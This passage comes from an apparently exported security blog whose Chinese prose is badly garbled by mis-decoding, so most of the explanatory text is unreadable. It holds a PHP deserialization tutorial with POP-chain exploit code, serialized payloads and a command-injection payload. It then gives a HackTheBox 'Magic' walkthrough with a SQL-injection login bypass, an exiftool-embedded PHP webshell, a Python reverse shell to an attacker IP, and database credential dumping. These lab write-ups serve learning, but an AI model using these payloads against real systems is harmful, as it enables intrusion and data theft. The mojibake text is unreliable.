ä¸ºè¿™ä¸ªå‡½æ•°èƒ½åœ¨å¯¹è±¡é”€æ¯çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ï¼Œä¸ç”¨æˆ‘ä»¬äººå·¥çš„å¹²é¢„ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹æ€ä¹ˆåˆ©ç”¨ã€‚ æˆ‘ä»¬çœ‹åˆ°__destruct()é‡Œé¢åªç”¨åˆ°äº†ä¸€ä¸ªå±æ€§testï¼Œå†è§‚å¯Ÿä¸€ä¸‹ é‚£äº›åœ°æ–¹è°ƒç”¨äº†action()å‡½æ•°ï¼Œçœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ä¸­æœ‰æ²¡æœ‰å­˜åœ¨æ‰§è¡Œå‘½ä»¤æˆ–è€…æ˜¯å…¶ä»–æˆ‘ä»¬èƒ½åˆ©ç”¨çš„ç‚¹çš„ï¼Œæœç„¶åœ¨ Evil è¿™ä¸ªç±»ä¸­å‘ç°ä»–çš„ action() å‡½æ•°è°ƒç”¨äº† eval(),é‚£æˆ‘ä»¬çš„æƒ³æ³•å°±å¾ˆæ˜ç¡®äº†ï¼Œåªéœ€è¦å°†demoè¿™ä¸ªç±»ä¸­çš„testå±æ€§ç¯¡æ”¹ä¸º Evil è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œç„¶åä¸ºäº† eval èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬è¿˜è¦ç¯¡æ”¹Evilå¯¹è±¡çš„ test2 å±æ€§ï¼Œå°†å…¶æ”¹æˆè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ 123456789101112131415161718&lt;?phpclass demo&#123; private $test; function __construct() &#123; $this-&gt;test = new Evil(); &#125;&#125;class Evil&#123; var $test2 = &quot;phpinfo()&quot;;&#125;$demo = new demo();$data = serialize($demo);var_dump($data); è¾“å‡ºçš„payloadï¼š 1O:4:&quot;demo&quot;:1:&#123;s:10:&quot;\\000demo\\000test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125; è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªç®€å•çš„PHPååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚ é€šè¿‡è¿™ä¸ªç®€å•çš„ä¾‹å­æ€»ç»“ä¸€ä¸‹å¯»æ‰¾ PHP ååºåˆ—åŒ–æ¼æ´çš„æ–¹æ³•æˆ–è€…æµç¨‹ (1)å¯»æ‰¾unserialize()å‡½æ•°çš„å‚æ•°æ˜¯å¦æœ‰æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼› (2)å¯»æ‰¾æˆ‘ä»¬çš„ååºåˆ—åŒ–çš„ç›®æ ‡ï¼Œé‡ç‚¹å¯»æ‰¾å­˜åœ¨ wakeup() æˆ– destruct() é­”æ³•å‡½æ•°çš„ç±»ï¼› (3)ä¸€å±‚ä¸€å±‚åœ°ç ”ç©¶è¯¥ç±»åœ¨é­”æ³•æ–¹æ³•ä¸­ä½¿ç”¨çš„å±æ€§å’Œå±æ€§è°ƒç”¨çš„æ–¹æ³•ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å¯æ§çš„å±æ€§èƒ½å®ç°åœ¨å½“å‰è°ƒç”¨çš„è¿‡ç¨‹ä¸­è§¦å‘çš„ï¼› (4)æ‰¾åˆ°æˆ‘ä»¬è¦æ§åˆ¶çš„å±æ€§äº†ä»¥åæˆ‘ä»¬å°±å°†è¦ç”¨åˆ°çš„ä»£ç éƒ¨åˆ†å¤åˆ¶ä¸‹æ¥ï¼Œç„¶åæ„é€ åºåˆ—åŒ–ï¼Œå‘èµ·æ”»å‡»ã€‚ 0x03 PHPååºåˆ—åŒ–POPé“¾ POPé“¾ä»‹ç» POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„ è¯´çš„å†å…·ä½“ä¸€ç‚¹å°±æ˜¯ ROP æ˜¯é€šè¿‡æ ˆæº¢å‡ºå®ç°æ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæµç¨‹ï¼Œè€Œæˆ‘ä»¬çš„ååºåˆ—åŒ–æ˜¯é€šè¿‡æ§åˆ¶å¯¹è±¡çš„å±æ€§ä»è€Œå®ç°æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œè¿›è€Œè¾¾æˆåˆ©ç”¨æœ¬èº«æ— å®³çš„ä»£ç è¿›è¡Œæœ‰å®³æ“ä½œçš„ç›®çš„ã€‚ POPé“¾demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?php//flag is in flag.phperror_reporting(1);class Read &#123; public $var; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125; public function __invoke()&#123; $content = $this-&gt;file_get($this-&gt;var); echo $content; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;) &#123; $this-&gt;source = $file; echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;; &#125; public function __toString() &#123; return $this-&gt;str[&#x27;str&#x27;]-&gt;source; &#125; public function _show() &#123; if(preg_match(&#x27;/gopher|http|ftp|https|dict|\\.\\.|flag|file/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct() &#123; $this-&gt;p = array(); &#125; public function __get($key) &#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;hello&#x27;]))&#123; unserialize($_GET[&#x27;hello&#x27;]);&#125;else&#123; $show = new Show(&#x27;pop3.php&#x27;); $show-&gt;_show();&#125; å¯»æ‰¾POPé“¾è¿‡ç¨‹ï¼š 66è¡Œä»£ç å¤„æœ‰unserialize()å‡½æ•°ï¼Œè€Œä¸”å‚æ•°å¯æ§ï¼› åœ¨Showè¿™ä¸ªç±»ä¸­æœ‰__wakeup()æ–¹æ³•ï¼› __wakeup()æ–¹æ³•ä¸­è°ƒç”¨äº†preg_replace()å‡½æ•°ï¼Œå¦‚æœsourceå±æ€§æ˜¯æŸä¸€ä¸ªç±»å¯¹è±¡çš„è¯ï¼Œä¼šè§¦å‘__toString()æ–¹æ³•ï¼› åœ¨Showè¿™ä¸ªç±»ä¸­æœ‰__toString()æ–¹æ³•ï¼› __toSting()æ–¹æ³•ä¸­è¯•å›¾è·å–å±æ€§strä¸­keyä¸ºstrçš„å€¼çš„sourceå±æ€§ï¼Œå¦‚æœstr['str']æ˜¯æŸä¸€ä¸ªç±»å¯¹è±¡çš„è¯ï¼Œä¼šè§¦å‘__get()æ–¹æ³•ï¼› åœ¨Testè¿™ä¸ªç±»ä¸­æœ‰__get()æ–¹æ³•ï¼› __get()æ–¹æ³•ä¸­ï¼Œå¦‚æœpå±æ€§æ˜¯æŸä¸€ä¸ªç±»å¯¹è±¡çš„è¯ï¼Œä¼šå‡ºå‘__invoke()æ–¹æ³•ï¼› åœ¨Readè¿™ä¸ªç±»ä¸­æœ‰__invoke()æ–¹æ³•ï¼› __invoke()æ–¹æ³•ä¸­å°è¯•è¯»å–å¹¶æ‰“å°å±æ€§varçš„æ–‡ä»¶å†…å®¹ï¼Œä¸ºäº†è¯»å–flag.phpçš„å†…å®¹ï¼Œå¯ä»¥è®©var = flag.phpã€‚ ç”Ÿæˆååºåˆ—åŒ–Payloadçš„expï¼š 123456789101112131415161718192021&lt;?phpclass Read &#123; public $var = flag.php;&#125;class Show &#123; public $source; public $str;&#125;class Test &#123; public $p;&#125;$r = new Read();$s = new Show();$t = new Test();$t-&gt;p = $r;$s-&gt;str[&#x27;str&#x27;] = $t;$s-&gt;source = $s;var_dump(serialize($s)); æœ€åå¾—å‡ºæ¥çš„payloadï¼š 1O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:&#123;s:3:&quot;var&quot;;s:7:&quot;flagphp&quot;;&#125;&#125;&#125;&#125; æœ‰å…³PHPååºåˆ—åŒ–çš„åŸºç¡€ç¯‡å°±å†™åˆ°è¿™ï¼Œå½“ç„¶è‚¯å®šä¸æ­¢äºæ­¤ï¼Œæ¥ä¸‹æ¥æ˜¯è¿›é˜¶ç¯‡ï¼Œæ¶‰åŠåˆ°SoapClientååºåˆ—åŒ–ï¼ŒPHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼ŒPharååºåˆ—åŒ–ï¼ŒSessionååºåˆ—åŒ–ï¼Œä»¥åŠæœ€åä¸€ä¸ªVulnHubé¶æœºæ”¶å°¾ã€‚ 0x04 ä¸€é“å®ä¾‹ è¯¥é¢˜å‡ºå¤„ï¼šhttps://www.cnblogs.com/nul1/p/9928797.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#x27;flag&#x27;,&#x27;&#x27;,$str); return $str; &#125; function echos($host)&#123; system(&quot;echos $host&quot;.$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echos&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first=&#x27;hi&#x27;;$var=&#x27;var&#x27;;$bbb=&#x27;bbb&#x27;;$ccc=&#x27;ccc&#x27;;$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===&quot;doller&quot;)&#123; @parse_str($_GET[&#x27;a&#x27;]); if($var===&quot;give&quot;) &#123; if($bbb===&quot;me&quot;) &#123; if($ccc===&quot;flag&quot;) &#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&#x27;come&#x27;]; unserialize($come); &#125; &#125; else &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else &#123; echo &quot;NO&quot;; &#125;&#125;else&#123; echo &quot;Can you hack me?&lt;br&gt;&quot;;&#125;?&gt; å˜é‡è¦†ç›–æ¼æ´ $$ 12345678foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125; ?first=dollerç»•è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥ parse_str å¦‚æœç›´æ¥è¿™æ ·å†™?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flagçš„è¯ï¼ŒPHPè§£æçš„æ˜¯å››ä¸ªå‚æ•°ï¼Œè€Œä¸æ˜¯æˆ‘æƒ³å¾—åˆ°çš„ä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ªfirstå’Œä¸€ä¸ªaã€‚ä¸è¿‡å¥½åœ¨æœ‰URLç¼–ç è¿™ç§ä¸œè¥¿ï¼Œå¯ä»¥åœ¨è¿™æœ‰æ­§ä¹‰çš„æ—¶å€™æ‰­è½¬å±€åŠ¿ï¼Œæˆ‘ä»¬æŠŠ&amp;è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ ·å­è§£ææ—¶å°±ä¼šè®¤ä¸ºæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²äº†ï¼Œå³ï¼š ?first=doller&amp;a=var=give%26bbb=me%26ccc=flag ååºåˆ—åŒ–æ¼æ´ æŸ¥çœ‹ä»£ç ï¼Œå‘ç°åˆ°äº†ååºåˆ—åŒ–çš„åœ°æ–¹äº†ï¼Œè€Œååºåˆ—åŒ–çš„æ¥æºæ˜¯é€šè¿‡POSTæäº¤çš„comeå‚æ•°ï¼ŒçŸ¥é“äº†è¦ååºåˆ—åŒ–ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šè¦ååºåˆ—åŒ–çš„ç±»äº†ã€‚è¿™ä¸ªæºç å°±ä¸€ä¸ªç±»comeï¼Œå¯¹è¿™ä¸ªç±»è¿›è¡Œå®¡è®¡ï¼Œé‡ç‚¹çœ‹__destructæ–¹æ³•ï¼š 12345function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echos&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125;&#125; call_user_func_array()å†…ç½®æ–¹æ³•çš„ä½œç”¨æ˜¯è°ƒç”¨ä¸€ä¸ªæŒ‡å®šæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¦è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºç»™è°ƒç”¨çš„å‡½æ•°ä¼ å‚ã€‚ä½†æ˜¯è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨ä¸€ä¸ªæ•°ç»„array($this, $this-&gt;method)æ¥è¡¨ç¤ºï¼Œæ„æ€å°±æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºæ˜¯è¯¥æ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œç¬¬äºŒä¸ªå…ƒç´ å°±æ˜¯æ–¹æ³•åã€‚è€Œä¸”ifè¯­å¥å·²ç»é™å®šäº†methodå‚æ•°å¿…é¡»æ˜¯echosã€‚å†æ¥çœ‹çœ‹echosè¿™ä¸ªç±»æ–¹æ³•ã€‚ 123function echos($host)&#123; system(&quot;echos $host&quot;.$host);&#125; system()å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä¸”hostå‚æ•°å¯æ§ï¼Œäºæ˜¯åˆ¤æ–­è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚äºæ˜¯æ€è·¯å¦‚ä¸‹ï¼š é€šè¿‡ååºåˆ—åŒ–æ§åˆ¶methodå’Œargsä¸¤ä¸ªæˆå‘˜å˜é‡ methodå¿…é¡»æ˜¯echosä¸ç„¶é€šä¸è¿‡ifåˆ¤æ–­ é€šè¿‡call_user_func_array()å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°è°ƒç”¨æœ¬ç±»ä¸­çš„echosæ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°ç»™æ–¹æ³•ä¼ å‚- ç”±äºechosæ–¹æ³•ä¸­çš„systemå‡½æ•°çš„å‚æ•°æ˜¯æ‹¼æ¥å½¢å‚çš„ï¼Œå®Œæˆå‘½ä»¤æ³¨å…¥ã€‚ æ ¹æ®é¡ºåºï¼Œå…ˆæ‰§è¡Œ__wakeupå†æ‰§è¡Œ__destructï¼Œ__wakeupä¸­å¯¹å‚æ•°æœ‰ä¸€ä¸ªè¿‡æ»¤çš„å¤„ç†ï¼š 1234567891011function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125;&#125;function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#x27;flag&#x27;,&#x27;&#x27;,$str); return $str;&#125; å¯ä»¥çœ‹åˆ°å®ƒé»˜è®¤å°†argså˜é‡è§†ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¯¹å…¶è¿›è¡Œäº†foreachï¼Œç„¶ååˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ é€å»äº†wafè¿›è¡Œè¿‡æ»¤ã€‚è¿™è¡¨æ˜æˆ‘ä»¬ä¼ å…¥çš„argsæ˜¯ä¸€ä¸ªæ•°ç»„ã€‚å¹¶ä¸”argsä¸­ä¸å…è®¸å‡ºç°[&lt;&gt;*;|?\\n ]è¿™äº›å­—ç¬¦ï¼Œä»¥åŠflagå…³é”®è¯ã€‚ å¹¶ä¸”echosæ˜¯ä¸€ä¸ªé”™è¯¯çš„å‘½ä»¤ï¼Œæ‰€ä»¥ç»¼åˆä»¥ä¸Šä¸¤ç‚¹ï¼Œå¿…é¡»ä½¿ç”¨&amp;å‘½ä»¤è¿æ¥ç¬¦ã€‚ æ„é€ ååºåˆ—åŒ–ç±»ï¼š 123456&lt;?phpclass come&#123; private $method = &#x27;echos&#x27;; private $args = array(&#x27;&amp;cat$&#123;IFS&#125;/flag)&#x27;);&#125;echo serialize(new come()); å¾—åˆ°payloadï¼š 1O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:5:&quot;echos&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;i:0;s:16:&quot;&amp;cat$&#123;IFS&#125;&#x2F;flag)&quot;;&#125;&#125; å¦‚æœPHPç‰ˆæœ¬å¤§äº7.0ï¼Œå¯ä»¥ç›´æ¥æŠŠprivateå±æ€§æ”¹æˆpublic 0x05 Reference ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£PHPååºåˆ—åŒ–æ¼æ´ phpååºåˆ—åŒ–é‚£äº›äº‹","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Magic-Walkthrough","date":"2020-04-28T04:47:16.000Z","path":"Target_drone/HackTheBox/15.HTB-Magic-walkthrough/","text":"HTB::Magic Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap exiftool LinEnum.sh SQL Injection mysqldump sysinfo PATH variable 0x03 Pentesting Initial Enueration ç«¯å£æ‰«æï¼š 1234567891011121314151617181920212223$ nmap -A -Pn -T4 -p- 10.10.10.185Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-04-23 10:22 EDTStats: 0:10:27 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 22.07% done; ETC: 11:10 (0:36:54 remaining)Warning: 10.10.10.185 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.10.185Host is up (0.34s latency).Not shown: 65455 closed ports, 78 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)| 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)|_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Magic PortfolioService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 6500.05 seconds å¸¸è§„80ç«¯å£ï¼Œè¿›å…¥ç«™ç‚¹å‘ç°æœ‰ä¸€ä¸ªLoginç•Œé¢ï¼Œéšä¾¿è¯•ä¸€ä¸‹ï¼Œåˆæ˜¯å¸¸è§„çš„SQL Injectionï¼ŒBurpä¿®æ”¹æ•°æ®ï¼Œpayloadä¸‡èƒ½å¯†ç admin' or 1=1--+å³å¯ã€‚ ç™»å½•æˆåŠŸåï¼Œæœ‰ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„åŠŸèƒ½ï¼Œç»è¿‡å°è¯•ä¹‹åå‘ç°åªèƒ½ä¸Šä¼ å›ºå®šçš„å›¾ç‰‡æ ¼å¼çš„æ–‡ä»¶ï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰å¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œæ£€æŸ¥ã€‚éšä¾¿æ‰¾ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶ï¼Œç”¨exiftoolå·¥å…·å†™å…¥payloadï¼š 1exiftool -Comment&#x3D;&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; normal.jpg æ›´æ”¹åç¼€åï¼š 1mv normal.jpg normal.php.jpg ä¸Šä¼ æ–‡ä»¶åï¼Œåœ¨ä¸»é¡µæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°ä¸Šä¼ å›¾ç‰‡çš„ç›¸å¯¹è·¯å¾„æ˜¯images/uploads/normal.php.jpgï¼Œè®¿é—®è¯¥è·¯å¾„å‘ç°å¯ä»¥æ­£å¸¸å›æ˜¾ã€‚ å†åœ¨urlä¸Šæ·»åŠ ä¸‹é¢å†…å®¹ä½œä¸ºcmdå‚æ•°ï¼Œç”¨æ¥æ‰§è¡Œreverse shellï¼Œåœ¨æœ¬æœºç›‘å¬ç›¸åº”çš„ç«¯å£ï¼š 1python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; æ³¨æ„ï¼šè¿™ä¸ªé¶æœºåªæœ‰python3çš„ç¯å¢ƒ æˆåŠŸæ‹¿åˆ°www-dataæƒé™ï¼š 123456789$ nc -lvp 4444listening on [any] 4444 ...10.10.10.185: inverse host lookup failed: Unknown hostconnect to [10.10.14.16] from (UNKNOWN) [10.10.10.185] 58816&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off$ iduid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)$ python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$ Getting User Access æŸ¥æ‰¾æ•æ„Ÿæ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$ cd ..&#x2F;..&#x2F;cd ..&#x2F;..&#x2F;www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ lslsassets db.php5 images index.php login.php logout.php upload.phpwww-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ cat db.php5cat db.php5&lt;?phpclass Database&#123; private static $dbName &#x3D; &#39;Magic&#39; ; private static $dbHost &#x3D; &#39;localhost&#39; ; private static $dbUsername &#x3D; &#39;theseus&#39;; private static $dbUserPassword &#x3D; &#39;iamkingtheseus&#39;; private static $cont &#x3D; null; public function __construct() &#123; die(&#39;Init function is not allowed&#39;); &#125; public static function connect() &#123; &#x2F;&#x2F; One connection through whole application if ( null &#x3D;&#x3D; self::$cont ) &#123; try &#123; self::$cont &#x3D; new PDO( &quot;mysql:host&#x3D;&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname&#x3D;&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword); &#125; catch(PDOException $e) &#123; die($e-&gt;getMessage()); &#125; &#125; return self::$cont; &#125; public static function disconnect() &#123; self::$cont &#x3D; null; &#125;&#125; æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç”¨æˆ·åæ˜¯theseusï¼Œå¯†ç æ˜¯iamkingtheseusï¼Œå°è¯•ç”¨è¿™ä¸ªå¯†ç åˆ‡æ¢ç”¨æˆ·ï¼š 12345www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ su theseussu theseusPassword: iamkingtheseussu: Authentication failure å¯†ç é”™è¯¯ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯MySQLæ•°æ®åº“çš„ç™»å½•å¯†ç ã€‚å½“æˆ‘å‡†å¤‡ç”¨mysqlå‘½ä»¤æ—¶ï¼Œæç¤ºæˆ‘apt-get installï¼Œä½†æ˜¯é¶æœºä¸Šæ˜æ˜å°±è¿è¡Œç€MySQLæœåŠ¡ï¼Œ 12345678910111213141516171819202122232425www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ ls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysqlls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysql-rwxr-xr-x 1 root root 3627200 Jan 21 06:10 mysql_config_editor-rwxr-xr-x 1 root root 22558552 Jan 21 06:10 mysql_embedded-rwxr-xr-x 1 root root 5179616 Jan 21 06:10 mysql_install_db-rwxr-xr-x 1 root root 3616952 Jan 21 06:10 mysql_plugin-rwxr-xr-x 1 root root 3784424 Jan 21 06:10 mysql_secure_installation-rwxr-xr-x 1 root root 3653288 Jan 21 06:10 mysql_ssl_rsa_setup-rwxr-xr-x 1 root root 3569976 Jan 21 06:10 mysql_tzinfo_to_sql-rwxr-xr-x 1 root root 4442320 Jan 21 06:10 mysql_upgrade-rwxr-xr-x 1 root root 3799752 Jan 21 06:10 mysqladminlrwxrwxrwx 1 root root 10 Jan 21 06:10 mysqlanalyze -&gt; mysqlcheck-rwxr-xr-x 1 root root 4068280 Jan 21 06:10 mysqlbinlog-rwxr-xr-x 1 root root 3825320 Jan 21 06:10 mysqlcheck-rwxr-xr-x 1 root root 26952 Jan 21 06:10 mysqld_multi-rwxr-xr-x 1 root root 28448 Jan 21 06:10 mysqld_safe-rwxr-xr-x 1 root root 3875176 Jan 21 06:10 mysqldump-rwxr-xr-x 1 root root 7865 Jan 21 06:10 mysqldumpslow-rwxr-xr-x 1 root root 3791912 Jan 21 06:10 mysqlimportlrwxrwxrwx 1 root root 10 Jan 21 06:10 mysqloptimize -&gt; mysqlcheck-rwxr-xr-x 1 root root 4286120 Jan 21 06:10 mysqlpumplrwxrwxrwx 1 root root 10 Jan 21 06:10 mysqlrepair -&gt; mysqlcheck-rwxr-xr-x 1 root root 39016 Jan 12 2018 mysqlreport-rwxr-xr-x 1 root root 3790504 Jan 21 06:10 mysqlshow-rwxr-xr-x 1 root root 3809512 Jan 21 06:10 mysqlslap æ‰¾åˆ°äº† dump MySQL databaseï¼š 1mysqldump --databases Magic -utheseus -piamkingtheseus å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç admin:Th3s3usW4sK1ngã€‚ å†æŠŠæœ¬æœºçš„SSH public keyåŠ å…¥åˆ°é¶æœºçš„/home/thesues/.ssh/authenticated_keysï¼ŒSSHç›´æ¥ç™»å½•ï¼š 123456789101112131415161718192021$ ssh theseus@10.10.10.185The authenticity of host &#39;10.10.10.185 (10.10.10.185)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;10.10.10.185&#39; (ECDSA) to the list of known hosts.Welcome to Ubuntu 18.04.4 LTS (GNU&#x2F;Linux 5.3.0-42-generic x86_64)* Documentation: https:&#x2F;&#x2F;help.ubuntu.com* Management: https:&#x2F;&#x2F;landscape.canonical.com* Support: https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage* Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch 29 packages can be updated.0 updates are security updates.Your Hardware Enablement Stack (HWE) is supported until April 2023.Last login: Sat Apr 25 22:27:50 2020 from 10.10.14.44theseus@ubuntu:~$ iduid&#x3D;1000(theseus) gid&#x3D;1000(theseus) 